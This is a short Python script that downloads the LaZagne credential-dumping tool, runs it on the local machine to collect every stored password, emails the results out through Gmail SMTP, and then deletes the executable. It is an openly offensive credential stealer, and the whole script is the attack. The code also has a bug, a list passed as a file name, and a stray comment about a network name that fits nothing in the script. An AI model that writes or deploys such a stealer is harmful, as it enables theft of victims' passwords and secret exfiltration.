#!/usr/bin/env python3
import requests, subprocess, smtplib, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("insert url download location here")  # insert url download location here

# UPC723762 represents the network name value and i have to customize it to my own.
result = subprocess.check_output("laZagne.exe all", shell=True)
send_email("email here", "password here", result)
os.remove("laZagne.exe")
